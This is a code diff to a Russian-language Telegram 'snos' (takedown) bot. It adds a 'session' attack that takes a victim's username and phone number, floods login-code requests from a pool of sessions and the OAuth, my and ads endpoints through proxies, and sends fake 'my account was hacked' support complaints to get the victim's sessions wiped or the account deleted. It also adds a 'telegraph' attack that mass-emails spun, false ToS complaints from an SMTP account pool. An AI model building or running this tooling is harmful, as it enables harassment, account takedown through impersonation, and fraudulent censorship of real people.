@@ -679,6 +679,10 @@ METHODS = {
                   "hint": "Цель — канал: t.me/username или @username.\nЕсли в ссылке есть ID поста (t.me/user/123) — жалоба уйдёт на пост."},
     "message":  {"e": "💬", "l": "Сообщение",
                  "hint": "Пришли ссылку на сообщение."},
+    "session":  {"e": "\U0001f511", "l": "Сессии",
+                 "hint": "Пришли юзернейм и номер жертвы одним сообщением:\n• <code>@username +79991234567</code>"},
+    "telegraph": {"e": "\U0001f4dd", "l": "Telegraph",
+                  "hint": "Пришли ссылку на статью: <code>telegra.ph/...</code>"},
 }
 
 
@@ -1418,6 +1422,439 @@ async def mail_bulk_send(target: str, reason_key: str) -> dict:
             "details": [{"name": r["from"], "proxy": r["to"],
                          "ok": r["ok"], "err": r["err"]} for r in rows]}
 
+
+
+# ── BR session-snos port: wipe the victim's active sessions ──
+# SendCode flood from our pool + oauth.telegram.org / my / ads floods via
+# proxies + 3 web-support complaints, then a 10-min victim-change monitor.
+SESSION_SNOS_MONITOR_STEP = 600      # seconds between victim checks
+SESSION_SNOS_MONITOR_MAX = 36        # give up after ~6h of silence
+
+SESSION_SNOS_OAUTH = [
+    ("5444323279", "https://fragment.com"),
+    ("5731754199", "https://steam.kupikod.com"),
+    ("210944655", "https://combot.org"),
+    ("319709511", "https://telegrambot.biz"),
+    ("1199558236", "https://bot-t.com"),
+    ("5709824482", "https://lzt.market"),
+    ("1803424014", "https://ru.telegram-store.com"),
+    ("5463728243", "https://www.spot.uz"),
+    ("6708902161", "https://ourauthpoint777.com"),
+    ("1852523856", "https://cabinet.presscode.app"),
+]
+
+SESSION_SUPPORT_TEXTS = [
+    ("Здравствуйте, поддержка Telegram! Мой аккаунт был взломан путем фишинга, "
+     "и моя активная сессия была сброшена. Сейчас на нем находится мошенник. "
+     "Прошу вас помочь мне, обнулив все сессии на аккаунте, чтобы я смог "
+     "восстановить доступ по SMS, либо удалить мой аккаунт. Спасибо!"),
+    ("Hello technical support, a stranger wrote to me today and asked me to change "
+     "something in my account settings, pretending to be Telegram support. I changed "
+     "what support asked me to do, and after a few minutes I was kicked out of my "
+     "account and I can't get into it. My account has been hacked. Please delete the "
+     "account or expel the scammer from the account in an alternative way."),
+    ("Здравствуйте! Хочу сообщить о проблеме с моим аккаунтом в телеграме. "
+     "Мой аккаунт был взломан мошенниками через фишинг ссылку, после перехода "
+     "меня выбинуло с моего аккаунта, а мошенники зашли туда. Я пытался войти "
+     "в аккаунт по номеру и запросом кода в СМС, но мошенники поставили "
+     "двухэтапную аутентификацию и привязали почту и блокируют мне вход. "
+     "Я прошу вас удалить все сессии на моем аккаунте или полностью удалить "
+     "мой аккаунт, потому что он украден мошенниками."),
+    ("Добрый день! Мой аккаунт Telegram был взломан. Я пытаюсь восстановить "
+     "доступ уже несколько дней, но каждый раз при запросе сброса пароля "
+     "приходит уведомление, что операция отменена. Это явно делает "
+     "злоумышленник. Помогите, пожалуйста, решить эту проблему."),
+    ("Hello, I am writing to report that my Telegram account was stolen. "
+     "I used this account for work, and without access to it I am unable to "
+     "complete my tasks. This is putting my job at serious risk. I urgently "
+     "request your immediate assistance in restoring access to my account or "
+     "taking any necessary action to secure it. Please treat this as a "
+     "priority issue."),
+    ("Здравствуйте, мой аккаунт был взломан и выставили на продажу на сайте. "
+     "Теперь на мой аккаунт постоянно кто-то заходит и даже если я завершаю "
+     "сессии то они всё равно заходят. Прошу принудительно завершить все "
+     "сессии, кроме моей текущей, и восстановить контроль над аккаунтом."),
+]
+SESSION_SUPPORT_SUBJECTS = [
+    "Взломан аккаунт", "Account hacked", "Stolen account",
+    "Аккаунт украден", "Мошенники захватили аккаунт", "Hack report",
+]
+
+_HTTP_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/126.0.0.0 Safari/537.36")
+
+
+def _http_proxy_session(px_url: str | None):
+    """ClientSession riding one proxy; socks via ProxyConnector, direct if None."""
+    if not px_url:
+        return aiohttp.ClientSession()
+    return aiohttp.ClientSession(
+        connector=ProxyConnector.from_url(px_url, rdns=True))
+
+
+def _snos_rand_email() -> str:
+    names = ["ivan", "alex", "dmitry", "sergey", "mike", "andrey", "pavel"]
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "mail.ru",
+               "protonmail.com"]
+    return (random.choice(names) + str(random.randint(10, 9999))
+            + "@" + random.choice(domains))
+
+
+async def _snos_victim_info(username: str, sessions: list,
+                            proxies: list) -> dict:
+    """id / has_photo / about / deleted of the victim via any pool session."""
+    from telethon.errors import RPCError
+    for sess in random.sample(sessions, min(3, len(sessions))):
+        name = sess.stem
+        proxy = pin_for_session(name, proxies)
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(name)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=proxy, device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"],
+                    lang_code=fp["lang_code"])
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=12)
+                    if not await client.is_user_authorized():
+                        continue
+                    entity = await client.get_entity(username)
+                    info = {
+                        "ok": True,
+                        "id": entity.id,
+                        "has_photo": entity.photo is not None,
+                        "about": getattr(entity, "about", None) or "",
+                        "deleted": getattr(entity, "deleted", False),
+                    }
+                    return info
+                finally:
+                    await client.disconnect()
+        except (Exception, RPCError) as e:
+            continue
+    return {"ok": False, "error": "not found / all probes failed"}
+
+
+async def _snos_sendcode_flood(phone: str, sessions: list,
+                               proxies: list) -> dict:
+    """SendCode flood: every pool session requests a login code for the phone."""
+    from telethon.errors import FloodWaitError, PhoneNumberInvalidError
+    from telethon.tl.functions.auth import SendCodeRequest
+    from telethon.tl.types import CodeSettings
+
+    async def one(sess, phone: str) -> tuple[str, str]:
+        name = sess.stem
+        proxy = pin_for_session(name, proxies)
+        try:
+            async with _session_lock(sess):
+                fp = session_fingerprint(name)
+                client = TelegramClient(
+                    str(sess.with_suffix("")), fp["api_id"], fp["api_hash"],
+                    proxy=proxy, device_model=fp["device"],
+                    system_version=fp["system_version"],
+                    app_version=fp["app_version"],
+                    lang_code=fp["lang_code"])
+                try:
+                    await asyncio.wait_for(client.connect(), timeout=12)
+                    if not await client.is_user_authorized():
+                        return name, "invalid"
+                    await client(SendCodeRequest(
+                        phone_number=phone, api_id=fp["api_id"],
+                        api_hash=fp["api_hash"], settings=CodeSettings()))
+                    return name, "sent"
+                except PhoneNumberInvalidError:
+                    return name, "invalid_phone"
+                except FloodWaitError as e:
+                    return name, f"flood_{e.seconds}s"
+                finally:
+                    await client.disconnect()
+        except Exception as e:
+            return name, f"err_{type(e).__name__}"
+
+    pool = list(sessions)
+    random.shuffle(pool)
+    results = await asyncio.gather(*[one(s, phone) for s in pool],
+                                   return_exceptions=True)
+    rows = [(r[0], r[1]) for r in results
+            if isinstance(r, tuple) and len(r) == 2]
+    sent = sum(1 for _, st in rows if st == "sent")
+    return {"sent": sent, "total": len(rows)}
+
+
+async def _snos_oauth_flood(phone: str, proxies: list) -> dict:
+    """oauth.telegram.org / my.telegram.org / ads.telegram.org code floods."""
+    px_urls = [proxy_to_url(p) for p in proxies]
+    px_urls = [u for u in px_urls if u]
+
+    async def post(url: str, data: dict, service: str) -> tuple[str, bool]:
+        px = random.choice(px_urls) if px_urls else None
+        headers = {
+            "Accept": "*/*",
+            "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://oauth.telegram.org",
+            "Referer": "https://oauth.telegram.org/auth",
+            "User-Agent": _HTTP_UA,
+            "X-Requested-With": "XMLHttpRequest",
+        }
+        try:
+            async with _http_proxy_session(px) as s:
+                async with s.post(url, data=data, headers=headers,
+                                  timeout=aiohttp.ClientTimeout(total=10),
+                                  ssl=False) as resp:
+                    return service, resp.status == 200
+        except Exception:
+            return service, False
+
+    tasks = []
+    for bot_id, origin in SESSION_SNOS_OAUTH:
+        tasks.append(post(
+            "https://oauth.telegram.org/auth/request",
+            {"phone": phone, "bot_id": bot_id, "origin": origin,
+             "request_access": "write", "return_to": origin},
+            origin.split("//", 1)[1]))
+    for _ in range(3):
+        tasks.append(post("https://my.telegram.org/auth/send_password",
+                          {"phone": phone}, "my.telegram.org"))
+        tasks.append(post("https://ads.telegram.org/auth/",
+                          {"phone": phone}, "ads.telegram.org"))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    ok_n = sum(1 for r in results
+               if isinstance(r, tuple) and r[1] is True)
+    return {"sent": ok_n, "total": len(results)}
+
+
+async def _snos_web_support(phone: str, username: str, victim_id: int,
+                            proxies: list) -> dict:
+    """3 complaints to telegram.org/support form, rotated texts via proxies."""
+    px_urls = [proxy_to_url(p) for p in proxies]
+    px_urls = [u for u in px_urls if u]
+    texts = random.sample(SESSION_SUPPORT_TEXTS, min(3, len(SESSION_SUPPORT_TEXTS)))
+    ok_n = 0
+    for text in texts:
+        full = (text + "\n\nДанные аккаунта:\n"
+                + "Номер телефона: " + phone + "\n"
+                + "ID аккаунта: " + str(victim_id) + "\n"
+                + "Username: @" + username)
+        payload = {
+            "subject": random.choice(SESSION_SUPPORT_SUBJECTS),
+            "message": full,
+            "email": _snos_rand_email(),
+            "phone": phone,
+        }
+        headers = {
+            "User-Agent": _HTTP_UA,
+            "Referer": "https://telegram.org/support",
+            "Origin": "https://telegram.org",
+        }
+        px = random.choice(px_urls) if px_urls else None
+        ok = False
+        try:
+            async with _http_proxy_session(px) as s:
+                async with s.post(
+                        "https://telegram.org/support?setln=ru",
+                        data=payload, headers=headers,
+                        timeout=aiohttp.ClientTimeout(total=15),
+                        ssl=False) as resp:
+                    ok = resp.status == 200
+        except Exception:
+            ok = False
+        if ok:
+            ok_n += 1
+        await asyncio.sleep(random.uniform(1.5, 3.5))
+    return {"sent": ok_n, "total": len(texts)}
+
+
+async def _snos_monitor_loop(username: str, victim_id: int,
+                             baseline: dict, uid: int) -> None:
+    """Every 10 min: victim avatar/about/deleted vs baseline -> log on change."""
+    sessions = load_sessions()
+    proxies = load_pin_proxies()
+    for _check in range(SESSION_SNOS_MONITOR_MAX):
+        await asyncio.sleep(SESSION_SNOS_MONITOR_STEP)
+        st = await _snos_victim_info(username, sessions, proxies)
+        if not st.get("ok"):
+            continue
+        changes = []
+        if st.get("deleted"):
+            changes.append("🗑 Аккаунт удалён")
+        if baseline.get("has_photo") and not st["has_photo"]:
+            changes.append("🖼 Аватарка исчезла")
+        if baseline.get("about") and not st["about"]:
+            changes.append("📝 Описание пропало")
+        if changes:
+            await push_send_log("Снос сессий — монитор", [
+                f"🎯 <code>@{html_mod.escape(username)}</code> ({victim_id})",
+                *changes,
+                f"👤 уведомить: <code>{uid}</code>",
+                "✅ вероятно сессии снесены"])
+            return
+
+
+async def fire_session_snos(victim_username: str, victim_phone: str,
+                            notify_uid: int = 0) -> dict:
+    """Full session-wipe cycle; real counts to the Logs channel."""
+    sessions = load_sessions()
+    proxies = load_pin_proxies()
+    if not sessions:
+        await push_send_log("Снос сессий", ["❌ пул sessions/ пуст"])
+        return {"ok": 0, "fail": 0, "total": 0, "details": []}
+    info = await _snos_victim_info(victim_username, sessions, proxies)
+    if not info.get("ok"):
+        await push_send_log("Снос сессий", [
+            f"🎯 <code>@{html_mod.escape(victim_username)}</code>",
+            f"❌ жертва не найдена: "
+            f"{html_mod.escape(str(info.get('error'))[:80])}"])
+        return {"ok": 0, "fail": 0, "total": 0, "details": [
+            {"name": victim_username, "proxy": "direct", "ok": False,
+             "err": str(info.get("error"))[:60]}]}
+    baseline = {"has_photo": info["has_photo"], "about": info["about"]}
+    sc = await _snos_sendcode_flood(victim_phone, sessions, proxies)
+    oa = await _snos_oauth_flood(victim_phone, proxies)
+    ws = await _snos_web_support(victim_phone, victim_username,
+                                 info["id"], proxies)
+    asyncio.create_task(_snos_monitor_loop(
+        victim_username, info["id"], baseline, notify_uid))
+    ok_total = sc["sent"] + oa["sent"] + ws["sent"]
+    total = sc["total"] + oa["total"] + ws["total"]
+    await push_send_log("Снос сессий", [
+        f"🎯 <code>@{html_mod.escape(victim_username)}</code> ({info['id']})",
+        f"📱 <code>{html_mod.escape(victim_phone)}</code>",
+        f"📱 SendCode-флуд: {sc['sent']}/{sc['total']}",
+        f"🌐 OAuth-флуд: {oa['sent']}/{oa['total']}",
+        f"📨 Web support: {ws['sent']}/{ws['total']}",
+        f"🔁 монитор раз в {SESSION_SNOS_MONITOR_STEP // 60} мин — "
+        f"уведомлю при изменении аватарки/описания"])
+    return {"ok": ok_total, "fail": total - ok_total, "total": total,
+            "details": [
+                {"name": f"SendCode {sc['sent']}/{sc['total']}",
+                 "proxy": "sessions", "ok": sc["sent"] > 0, "err": ""},
+                {"name": f"OAuth {oa['sent']}/{oa['total']}",
+                 "proxy": "proxies", "ok": oa["sent"] > 0, "err": ""},
+                {"name": f"Web support {ws['sent']}/{ws['total']}",
+                 "proxy": "proxies", "ok": ws["sent"] > 0, "err": ""}]}
+
+
+# ── BR telegraph port: kill telegra.ph articles via SMTP relay ──
+TELEGRAPH_RECIPIENTS = ["abuse@telegram.org", "support@telegram.org",
+                        "dmca@telegram.org"]
+TELEGRAPH_SUBJECTS = [
+    "ToS Violation Report", "Complaint: prohibited content",
+    "Report: policy violation", "Urgent: content review request",
+]
+
+
+async def telegraph_fetch_text(url: str) -> tuple[str, int]:
+    """Clean article text via the official Telegraph API; (text, status)."""
+    path = re.sub(r"^https?://(telegra\.ph|graph\.org)/", "",
+                  url.strip().rstrip("/"), flags=re.I)
+    api = f"https://api.telegra.ph/getPage/{path}?return_content=true"
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(api, timeout=aiohttp.ClientTimeout(total=12),
+                             headers={"User-Agent": "Mozilla/5.0"}) as resp:
+                if resp.status != 200:
+                    return "", resp.status
+                data = await resp.json(content_type=None)
+    except Exception:
+        return "", 0
+    if not data.get("ok"):
+        return "", 404
+
+    def extract(nodes) -> str:
+        if not nodes:
+            return ""
+        out = []
+        for n in nodes:
+            if isinstance(n, str):
+                out.append(n)
+            elif isinstance(n, dict):
+                out.append(extract(n.get("children", [])))
+        return " ".join(out)
+
+    text_a = re.sub(r"\s+", " ",
+                    extract(data.get("result", {}).get("content", []))).strip()
+    return text_a[:3000], 200
+
+
+def _telegraph_compose(url: str, article_text: str, used: set) -> tuple[str, str]:
+    """(subject, body) unique per email: EN ToS complaint + spin."""
+    body = ("Dear Telegram Support,\n\n"
+            "I am reporting a Telegraph article that violates Telegram's "
+            "Terms of Service (telegram.org/tos). The page contains "
+            "prohibited content.\n\n"
+            "Article: " + url + "\n\n"
+            + ("Excerpt: " + article_text[:400] + "\n\n" if article_text else "")
+            + "Please review and take appropriate action.\n\nThank you.")
+    subject = ""
+    for _ in range(20):
+        spun = mail_spin_text(body)
+        if spun not in used:
+            body = spun
+            break
+    used.add(body)
+    subject = random.choice(TELEGRAPH_SUBJECTS)
+    return subject, body
+
+
+async def fire_telegraph_snos(article_url: str, custom_text: str = "") -> dict:
+    """Article -> text; emails abuse/support/dmca from 1/3 of mails.txt."""
+    pool = _mail_load_pool()
+    if not pool:
+        await push_send_log("Telegraph (SMTP)", ["❌ пул mails.txt пуст"])
+        return {"ok": 0, "fail": 0, "total": 0, "details": []}
+    article_text, status = await telegraph_fetch_text(article_url)
+    if status == 404:
+        await push_send_log("Telegraph (SMTP)", [
+            f"🎯 {html_mod.escape(article_url)}",
+            "❌ статья не найдена (404)"])
+        return {"ok": 0, "fail": 0, "total": 0, "details": [
+            {"name": article_url[:60], "proxy": "direct", "ok": False,
+             "err": "404"}]}
+    senders = random.sample(pool, max(1, len(pool) // 3))
+    rows = []
+    sem = asyncio.Semaphore(3)
+    used: set = set()
+
+    async def _one(sender: str, pwd: str, host: str, recv: str):
+        if custom_text:
+            subj = random.choice(TELEGRAPH_SUBJECTS)
+            body = mail_spin_text(custom_text)
+        else:
+            subj, body = _telegraph_compose(article_url, article_text, used)
+        async with sem:
+            ok, err = await mail_send_one(sender, pwd, host, recv, subj, body)
+        rows.append({"from": _mail_mask(sender), "to": recv,
+                     "ok": ok, "err": err})
+        await asyncio.sleep(random.uniform(1.5, 2.5))
+
+    tasks = [(em, pwd, host, recv)
+             for em, pwd, host in senders
+             for recv in TELEGRAPH_RECIPIENTS]
+    CHUNK = 12
+    for i in range(0, len(tasks), CHUNK):
+        await asyncio.gather(*[_one(*t) for t in tasks[i:i + CHUNK]])
+        await asyncio.sleep(random.uniform(1.0, 2.0))
+
+    ok_n = sum(1 for r in rows if r["ok"])
+    real_rows = []
+    for r in rows:
+        mark = "✅ " if r["ok"] else "❌ "
+        line = mark + r["from"] + " -> " + r["to"]
+        if not r["ok"]:
+            line += " | " + html_mod.escape(r["err"])
+        real_rows.append(line)
+    await push_send_log(
+        "Telegraph (SMTP)",
+        [f"🎯 {html_mod.escape(article_url)}",
+         f"📄 статья: {len(article_text)} симв · "
+         f"✉️ тексты уникальные · 1/3 пула",
+         f"✅ {ok_n}/{len(rows)} доставлено"] + real_rows)
+    return {"ok": ok_n, "fail": len(rows) - ok_n, "total": len(rows),
+            "details": [{"name": r["from"], "proxy": r["to"],
+                         "ok": r["ok"], "err": r["err"]} for r in rows]}
 
 
 # ── BR bot-method: target whitelist + probe ───────────
@@ -2871,6 +3308,8 @@ def kb_methods() -> InlineKeyboardMarkup:
         "bot":      "Bot",
         "channel":  "Канал",
         "message":  "Сообщение",
+        "session":  "Сессии",
+        "telegraph": "Telegraph",
     }
     short_icons = {
         "web":      "5258423306255604960",
@@ -2885,6 +3324,8 @@ def kb_methods() -> InlineKeyboardMarkup:
          InlineKeyboardButton(text=short["bot"], icon_custom_emoji_id=short_icons["bot"], callback_data="method:bot")],
         [InlineKeyboardButton(text=short["channel"], icon_custom_emoji_id="5260325873688518261", callback_data="method:channel"),
          InlineKeyboardButton(text=short["message"], icon_custom_emoji_id="5427181942934088912", callback_data="method:message")],
+        [InlineKeyboardButton(text=short["session"], icon_custom_emoji_id="5359529383319084413", callback_data="method:session"),
+         InlineKeyboardButton(text=short["telegraph"], icon_custom_emoji_id="5370546867786523009", callback_data="method:telegraph")],
         [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:home")],
     ]
     return InlineKeyboardMarkup(inline_keyboard=rows)
@@ -2957,7 +3398,17 @@ def summary_text(data: dict) -> str:
     ]
     if t.get("msg_id"):
         lines.append(f"\U0001f4e8 <b>ID:</b>  <code>#{t['msg_id']}</code>")
-    if data["method"] == "code":
+    if data["method"] == "session":
+        lines.append("🔑 Снос сессий жертвы: SendCode-флуд с пула, OAuth-флуд, "
+                     "3 жалобы на telegram.org/support + монитор.")
+        lines.append(f"📱 Номер жертвы: <code>{t.get('phone', '')}</code>.")
+    elif data["method"] == "telegraph":
+        _pool_n = len(_mail_load_pool())
+        lines.append(f"📝 Сендеры: <b>{max(1, _pool_n // 3)}/{_pool_n}</b> (1/3 пула), "
+                     f"писем: <b>{max(1, _pool_n // 3) * len(TELEGRAPH_RECIPIENTS)}</b> "
+                     "→ 3 ящика Telegram.")
+        lines.append("✍️ Свой текст = тело письма; пусто — авто-текст EN с уникализацией.")
+    elif data["method"] == "code":
         # code-flood sends login codes, not complaints — no reason/text here
         lines.append("\U0001f4f2 \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044e <b>25 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430</b> \u043d\u0430 \u043d\u043e\u043c\u0435\u0440.")
     elif data["method"] == "mail":
@@ -3078,8 +3529,26 @@ async def got_method(cb: CallbackQuery, state: FSMContext):
     if key not in METHODS:
         await cb.answer("\u274c", show_alert=True)
         return
-    await state.update_data(method=key)
+    _extra = {"method": key}
+    if key in ("session", "telegraph"):
+        _extra["reason"] = "other"
+    await state.update_data(**_extra)
     m = METHODS[key]
+    if key in ("session", "telegraph"):
+        await cb.message.edit_caption(
+            caption=_cx((
+                bq(f"<b>{NAME}</b>")
+                + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
+                + "\U0001f50d " + m["hint"]
+            )),
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="\u041d\u0430\u0437\u0430\u0434", icon_custom_emoji_id="5258132936401624790", callback_data="back:methods")],
+            ]),
+        )
+        await state.set_state(Report.target)
+        await cb.answer()
+        return
     if key == "bank":
         await cb.message.edit_caption(
             caption=_cx((
@@ -5176,6 +5645,23 @@ async def transplant_loop() -> None:
 @router.message(Report.target)
 async def got_target(msg: Message, state: FSMContext):
     _m = (await state.get_data()).get("method")
+    if _m == "session":
+        parts = (msg.text or "").split()
+        uname = parts[0].lstrip("@") if parts else ""
+        phone = _norm_phone(parts[1]) if len(parts) > 1 else ""
+        if not uname or not phone:
+            await msg.answer(_cx("\u274c \u041d\u0443\u0436\u043d\u043e: <code>@username +79991234567</code>"),
+                             parse_mode=ParseMode.HTML)
+            return
+        await state.update_data(
+            target={"raw": f"@{uname} {phone}", "entity": uname,
+                    "msg_id": None, "type": "session", "phone": phone})
+        await state.update_data(comment="")
+        data = await state.get_data()
+        await msg.answer(_cx(summary_text(data)), parse_mode=ParseMode.HTML,
+                         reply_markup=kb_confirm())
+        await state.set_state(Report.confirm)
+        return
     if _m == "code":
         phone = _norm_phone(msg.text or "")
         if not phone:
@@ -5197,6 +5683,11 @@ async def got_target(msg: Message, state: FSMContext):
         return
     if _m == "message" and not target.get("msg_id"):
         await msg.answer(_cx("❌ Нужна ссылка на сообщение."),
+                         parse_mode=ParseMode.HTML)
+        return
+    if _m == "telegraph" and not re.search(r"(telegra\.ph|graph\.org)",
+                                           msg.text or "", re.I):
+        await msg.answer(_cx("❌ Нужна ссылка на статью telegra.ph."),
                          parse_mode=ParseMode.HTML)
         return
     await state.update_data(target=target, comment="")
@@ -5462,7 +5953,9 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
 
     # auto-watch: every launched complaint puts its target under the
     # watchdog — death event later lands in the logs channel + user's PM
-    if data["method"] != "code":
+    # сторож только на аккаунты и ботов — каналы/посты/письма не сторожим
+    if data["method"] == "bot" or (data["method"] == "web"
+                                   and t["type"] in ("username", "raw")):
         try:
             _watch_add(cb.from_user.id, tgt_raw)
         except Exception as _wa_err:
@@ -5485,6 +5978,12 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
             return
         report_task = asyncio.create_task(
             fire_channel_reports(t["entity"], data["reason"], c, t["msg_id"]))
+    elif data["method"] == "session":
+        report_task = asyncio.create_task(
+            fire_session_snos(t["entity"], t.get("phone", ""),
+                              cb.from_user.id if cb.from_user else 0))
+    elif data["method"] == "telegraph":
+        report_task = asyncio.create_task(fire_telegraph_snos(tgt_raw, c))
     else:
         report_task = asyncio.create_task(
             fire_reports(t["entity"], data["reason"], c, t.get("msg_id"), data["method"]))
@@ -5495,6 +5994,10 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
                  if is_code else
                  "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043F\u0438\u0441\u0435\u043C..."
                  if data["method"] == "mail" else
+                 "Снос сессий жертвы..."
+                 if data["method"] == "session" else
+                 "Отправка писем..."
+                 if data["method"] == "telegraph" else
                  "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...")
     sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
     started = asyncio.get_event_loop().time()
@@ -5562,6 +6065,10 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
             if is_code else
             "\u2705 <b>\u041f\u0438\u0441\u044C\u043C\u0430 \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u044B</b>"
             if data["method"] == "mail" else
+            "\u2705 <b>\u0421\u043d\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439 \u0437\u0430\u043f\u0443\u0449\u0435\u043d</b>"
+            if data["method"] == "session" else
+            "\u2705 <b>\u041f\u0438\u0441\u044c\u043c\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
+            if data["method"] == "telegraph" else
             "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043B\u0435\u043d\u0430</b>")
     text = (
         bq(f"<b>{NAME}</b>  \u2014  \u0413\u043e\u0442\u043e\u0432\u043e")
@@ -5602,6 +6109,10 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
                      if is_code else
                      "Mail-\u0430\u0442\u0430\u043A\u0430"
                      if data["method"] == "mail" else
+                     "Снос сессий"
+                     if data["method"] == "session" else
+                     "Telegraph"
+                     if data["method"] == "telegraph" else
                      "\u041d\u043e\u0432\u0430\u044F \u0436\u0430\u043B\u043E\u0431\u0430")
         pool_text = (
             bq(f"<b>{NAME}</b>  \u2014  {pool_head}")
@@ -7146,6 +7657,10 @@ async def _fsm_render_state(cb: CallbackQuery, e: dict) -> None:
         elif st == "Report:target":
             _hint = ("Пришли ссылку на сообщение."
                      if data.get("method") == "message" else
+                     "Пришли юзернейм и номер: <code>@user +79991234567</code>."
+                     if data.get("method") == "session" else
+                     "Пришли ссылку на статью telegra.ph."
+                     if data.get("method") == "telegraph" else
                      "Пришли юзернейм цели (<code>@name</code> или ссылку).")
             await cb.message.answer(_cx(bq(f"<b>{NAME}</b>  —  Цель")
                                         + "\n\n" + _hint),
